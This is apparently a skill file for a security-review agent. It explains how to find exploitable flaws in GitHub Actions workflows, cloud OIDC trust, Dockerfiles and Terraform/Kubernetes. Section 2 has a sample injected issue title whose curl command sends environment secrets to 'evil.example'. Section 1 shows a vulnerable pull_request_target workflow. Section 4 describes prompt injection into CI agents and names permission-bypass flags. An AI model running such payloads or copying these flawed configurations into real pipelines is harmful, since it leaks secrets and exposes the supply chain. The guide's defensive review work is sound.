---
name: ci-cd-and-iac-security
category: security
description: Use when the diff changes a GitHub Actions workflow, a reusable action, a CI cache or artifact handoff, a Dockerfile or compose file, Terraform/HCL, Kubernetes manifests or Helm values, an environment overlay, a workload identity binding or a cloud OIDC trust policy - judged only where concretely exploitable
tech_stack: Supply chain & CI/IaC
source: original; cloudflare/security-audit-skill (MIT) CI, cloud and deployment attack classes (cache and artifact trust mixing, workload identity, config precedence drift, label trust), adapted; informed by trailofbits/skills (CC BY-SA 4.0, ideas only, own wording); GitHub Actions security hardening docs, zizmor audit names and OWASP Top 10:2025 A02/A03 cited by name only
---
# CI/CD and Infrastructure-as-Code Security

## Overview

A workflow file is code that runs with the repository's secrets and write token; an IaC file is the network and identity boundary of production. Both are reviewed as code. But IaC scanners produce long lists of hardening advice — this review reports only what an attacker can actually use.

**Core principle:** ask who can trigger it, what untrusted data reaches it, and what it holds (secrets, write tokens, cloud roles). A finding needs all three.

## 1. GitHub Actions — Untrusted Triggers

Events a stranger can cause: `pull_request_target`, `issue_comment`, `issues`, `discussion`, `workflow_run` (downstream of a fork PR), `pull_request_review(_comment)`. `pull_request` from a fork runs without secrets and with a read-only token. `workflow_dispatch` inputs come from people with write access — excluded.

**The pwn request** — CRITICAL, a blocking category:

```yaml
# ❌ fork code runs with secrets and a write token
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@<sha>
        with: { ref: "${{ github.event.pull_request.head.sha }}" }
      - run: npm ci && npm test        # install scripts and tests from the fork
        env: { NPM_TOKEN: "${{ secrets.NPM_TOKEN }}" }

# ✅ untrusted code runs under pull_request (no secrets); privileged work happens
#    in a separate workflow that never executes PR-supplied code
on: pull_request
```

Same shape: `workflow_run` downloading an artifact built from a fork and executing or trusting it (artifact poisoning) — including extracting it over the workspace, where it replaces scripts the job then runs, or reading a PR number, branch or path from it into a shell.

**Cache poisoning:** a job that runs untrusted code (a `pull_request_target` job that executes PR code, a job on a self-hosted runner shared with releases) can write an `actions/cache` entry under the base branch's scope; a privileged release or deploy workflow that later restores that key executes what was planted. Caches restored into release builds should come from jobs that never run untrusted code, or not be used there at all.

## 2. GitHub Actions — Expression Injection

```yaml
# ❌ an issue titled  a"; curl -sd "$(env)" evil.example; "  runs in the shell
- run: echo "New issue: ${{ github.event.issue.title }}"

# ✅ pass through the environment; the shell sees data, not code
- run: echo "New issue: $TITLE"
  env: { TITLE: "${{ github.event.issue.title }}" }
```

Attacker-controlled contexts: issue/PR/comment/review titles and bodies, `github.head_ref`, `github.event.pull_request.head.ref`/`label`, commit messages and author names, discussion text. The same applies inside `actions/github-script`'s `script:` and to values written into `$GITHUB_ENV` or `$GITHUB_OUTPUT` — an attacker-written `GITHUB_ENV` line can set `NODE_OPTIONS`, `LD_PRELOAD` or `BASH_ENV` for every later step.

## 3. GitHub Actions — Privilege and Pinning

- `permissions: write-all`, or no `permissions:` block in a repository whose default token is read-write: a note alone; part of the finding when combined with an injection above.
- Third-party actions pinned by tag or branch instead of a full commit SHA (supply-chain-and-dependency-review has the March 2025 and March 2026 tag hijacks).
- `secrets: inherit` to a reusable workflow in another repository; secrets echoed, written to files that are uploaded as artifacts, or passed to steps that run PR code.
- `actions/checkout` keeps the token in `.git/config` unless `persist-credentials: false`; uploading the workspace as an artifact then publishes it.
- Self-hosted runners used by workflows that fork PRs can trigger.

## 4. Agentic CI Workflows — a blocking category

An LLM agent step (code-review bots, issue triage agents, `claude-code-action`-style steps) that reads issue, PR or comment text **and** holds tools, secrets or a write token is a prompt-injection path from any stranger to those tools. Block when untrusted input reaches a tool-enabled agent, or when the diff adds a permission bypass: `--dangerously-skip-permissions`, `--yolo`-style flags, `allowed_tools: "Bash(*)"` or equivalent unrestricted shell, an allowed-users list of `*`. Details: llm-and-agent-security.

## 5. Cloud OIDC Trust

```json
// ❌ AWS role trust: any branch, any workflow, any repository in the org can assume it
"Condition": { "StringLike": { "token.actions.githubusercontent.com:sub": "repo:acme/*:*" } }
// ✅ exact repository and ref (or environment), plus the audience
"Condition": { "StringEquals": {
  "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
  "token.actions.githubusercontent.com:sub": "repo:acme/api:ref:refs/heads/main" } }
```

Same for GCP Workload Identity (a missing `attribute_condition`) and Azure federated credentials. A wildcard `sub` on a role that can deploy or read secrets → HIGH.

## 6. Dockerfiles and Compose

- **Secrets in layers:** `ARG`/`ENV` carrying a token, `COPY .env`, `RUN echo $TOKEN > ~/.npmrc` deleted in a later layer (it stays in the earlier one). ✅ `RUN --mount=type=secret,id=npmrc …`.
- **Remote code at build:** `curl … | sh` of an unpinned URL; `ADD https://…` without `--checksum`.
- **Escape surfaces:** `privileged: true`, `/var/run/docker.sock` mounted into a container that handles untrusted input, `network_mode: host` for an internet-facing service.
- Running as root or a missing `USER` is hardening — not reported alone.

## 7. Terraform, Kubernetes, Helm — only when concretely exploitable

| Pattern | Finding when |
|---------|--------------|
| `acl = "public-read"`, public-access block off, bucket policy `Principal: "*"`, GCS `allUsers` | the bucket holds non-public data |
| Security group / firewall `0.0.0.0/0` | on SSH, RDP, database, cache, search or admin ports — not on 80/443 of a public load balancer |
| IAM `Action: "*"`/`Resource: "*"`, broad `iam:PassRole`, trust `Principal: {"AWS": "*"}` without a condition | attached to a workload or assumable from outside |
| `publicly_accessible = true` on a database | always worth a HIGH |
| Pod `privileged: true`, `hostPID`, `hostNetwork`, `hostPath: /` or the container runtime socket | the workload processes untrusted input |
| ClusterRoleBinding to `cluster-admin`, RBAC `verbs: ["*"]` on `secrets` for an app service account | the pod is reachable from outside the cluster |
| Plain-text secrets in Helm values, ConfigMaps or `.tfvars` committed | live values (secrets-and-crypto-review) |

## 8. Workload Identity and Runtime Configuration

- **Identity reach:** a pod, function or worker identity bound to a broad cloud role, while request or job input selects the target (a bucket, a project, a queue name) — the service becomes a deputy for every resource the role can touch. Broad policy alone is hardening; the finding is input choosing the resource.
- **Federation trust:** workload identity or role-assumption conditions that accept any namespace, service account or repository (`…svc.id.goog[*/*]`, a missing `sub`/`aud` condition, an external id that is not checked).
- **Labels and namespaces as trust:** a NetworkPolicy, admission rule or secret access granted by a label or namespace that a less-trusted deployer can set on their own workload.
- **Config precedence drift:** the base file is safe but an overlay, values file, environment variable or flag disables authentication, TLS verification or tenant scoping in an environment that is actually deployed (`AUTH_DISABLED=true` in `values-prod.yaml`, `--insecure` in a production Kustomize patch). Read the final rendered value for each environment the repository deploys.
- **Bypass of the front door:** a `Service` of type `LoadBalancer`/`NodePort`, an extra port or a health route that reaches a backend which trusts identity headers set by an ingress or auth proxy (http-cache-and-proxy-trust §5).
- **Secrets in the wrong place:** credentials in container `args`, in a ConfigMap rather than a Secret, or in environment variables shared with sidecars that run untrusted code.

Whether the deployed environment uses a manifest — or a cloud default overrides it — is often outside the repository; when that one fact decides a HIGH, write a needs-validation note (source-visibility-needs-validation).

## Common Mistakes

- Reporting every Checkov/Trivy/zizmor hardening rule as a finding.
- Reporting `${{ inputs.x }}` in a `workflow_dispatch` workflow as injection.
- Reporting `pull_request_target` that checks out only the base branch and never runs PR code.
- Reporting `0.0.0.0/0` on port 443 of a public load balancer.

## Red Flags

- `pull_request_target` or `workflow_run` together with `head.sha`, `head.ref` or `github.event.pull_request` in a checkout `ref:`.
- `${{ github.event.` inside a `run:` or `script:` block.
- `>> $GITHUB_ENV` with event data.
- An LLM step with tool permissions in a workflow triggered by `issues` or `issue_comment`.
- `StringLike` with `:*` on a `token.actions.githubusercontent.com:sub` condition.
- `actions/cache` restore in a release or deploy workflow whose key a PR-triggered job can also save.
- `download-artifact` followed by `unzip` into the workspace or by `run:` steps that read files from the artifact.
- A production overlay or values file that sets an auth, TLS or debug switch the base file keeps safe.

## References (names and links only)

[GitHub Actions security hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions) · [zizmor audits](https://docs.zizmor.sh/audits/) · [OWASP Top 10:2025](https://owasp.org/Top10/2025/) A02 Security Misconfiguration, A03 Software Supply Chain Failures · [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
